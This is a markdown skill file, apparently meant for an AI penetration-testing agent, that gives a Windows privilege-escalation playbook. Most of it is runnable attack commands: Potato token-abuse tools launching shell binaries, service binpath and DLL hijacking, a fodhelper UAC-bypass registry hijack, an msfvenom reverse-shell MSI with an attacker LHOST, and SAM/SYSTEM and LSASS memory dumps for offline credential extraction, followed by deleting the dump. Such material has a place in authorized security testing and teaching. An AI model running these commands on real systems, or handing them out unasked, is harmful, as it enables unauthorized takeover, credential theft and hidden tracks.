---
name: privilege_escalation_windows
description: Windows privilege escalation — token abuse (SeImpersonate/Potato), service exploitation, UAC bypass, DLL hijacking, unquoted paths, AlwaysInstallElevated, credential hunting.
---

# Windows Privilege Escalation

## Quick Reconnaissance

```powershell
# Who am I? What privileges?
whoami /all
whoami /priv
whoami /groups

# System info
systeminfo
hostname

# Patch level
wmic qfe list

# Services (look for unquoted paths, weak permissions)
wmic service get name,pathname,startmode | findstr /i "auto"
sc qc <service_name>

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# AlwaysInstallElevated?
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Auto-run programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Stored credentials
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
```

## Token Abuse (SeImpersonatePrivilege)

If `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, you can capture a SYSTEM token:

### Potato Attack Family

| Variant | Protocol | Requirements | Notes |
|---|---|---|---|
| **Rogue Potato** | RPC + relay | Outbound 135 | Needs external relay |
| **Sweet Potato** | Multiple | Various | Combination of methods |
| **Juicy Potato** | COM + RPC | Windows < 2019 / SeImpersonate | Classic, patched on 2019+ |
| **PrintSpoofer** | Print Spooler | Print Spooler running | No relay needed |
| **God Potato** | NTLM Relay | Works on newer Windows | Most reliable currently |

```powershell
# Check if SeImpersonate is available
whoami /priv | findstr Impersonate

# PrintSpoofer (simplest if Print Spooler is running)
PrintSpoofer.exe -i -c "C:\temp\shell.exe"

# GodPotato (works on Server 2016-2022 with SeImpersonate)
GodPotato -cmd "cmd /c whoami > C:\temp\output.txt"

# JuicyPotato (older systems)
JuicyPotato.exe -l 1337 -p c:\temp\rev.exe -t * -c {CLSID}
```

### Manual Token Theft

```powershell
# If you have access to a SYSTEM process
# Use incognito or token impersonation
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# Invoke-TokenManipulation (PowerShell)
Import-Module PowerSploit
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

## Service Exploitation

### Unquoted Service Path

```powershell
# Find services with spaces in unquoted paths
wmic service get name,pathname | findstr /i /v "C:\Windows"

# Example: C:\Program Files\Some Service\service.exe
# Place malicious binary at:
#   C:\Program.exe (runs first due to path resolution)
#   C:\Program Files\Some.exe
```

### Weak Service Permissions

```powershell
# Check with accesschk or icacls
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
icacls "C:\Program Files\Service\service.exe"

# If SERVICE_CHANGE_CONFIG:
sc config <service> binpath= "C:\temp\shell.exe"
sc stop <service> && sc start <service>

# If writable binary:
# Replace service.exe with a shell/reverse shell binary
# Then restart the service
```

### Service DLL Hijacking

```powershell
# Check what DLLs a service loads
# (use Process Monitor or ListDLLs)
listdlls.exe <service.exe>

# Find a DLL the service loads from a writable directory
# Place your malicious DLL there
```

## UAC Bypass

If you're in the Administrators group but running with limited token:

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Common UAC bypass techniques:
# fodhelper.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c start /b C:\temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d "" /f
fodhelper.exe

# computerdefaults.exe (same technique)
# eventvwr.exe (registry hijack)
# sdclt.exe (Shell Open command)
```

## AlwaysInstallElevated

If both registry keys return `0x1`, any .msi runs as SYSTEM:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o /tmp/pwned.msi

# Execute
msiexec /quiet /qn /i C:\temp\pwned.msi
```

## Credential Hunting

```powershell
# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Unattended installation files
dir /s /b C:\Windows\Panther\*.xml
dir /s /b C:\Windows\System32\sysprep\*.xml
type C:\Windows\Panther\unattend.xml

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Saved RDP credentials
cmdkey /list | findstr "TERMSRV"
# Extract with:
dir /a C:\Users\*\AppData\Local\Microsoft\Credentials\

# SAM/SYSTEM (if we can read them)
reg save hklm\sam C:\temp\sam.save
reg save hklm\system C:\temp\system.save
# Copy to /workspace/output/ for offline extraction with secretsdump
```

## LSASS Memory Dump

```powershell
# comsvcs.dll MiniDump (built-in, no extra tools)
rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Find LSASS PID
tasklist /fi "IMAGENAME eq lsass.exe"

# If we have debug privileges (SeDebugPrivilege)
# procdump (Sysinternals)
procdump.exe -ma lsass.exe C:\temp\lsass.dmp

# Save dump to /workspace/output/ for offline pypykatz/mimikatz
copy C:\temp\lsass.dmp /workspace/output/
del C:\temp\lsass.dmp
```

## DLL Search Order Hijacking

```powershell
# Find applications that load DLLs from the current directory
# Place malicious DLL where the app runs (if writable)

# Check PATH for writable directories
echo %PATH%
# Test each directory for write access
icacls "C:\Some\Writable\Path" | findstr /i "Users.*W"

# Place your DLL that the target process loads
# Ensure the function exports match what the process expects
```
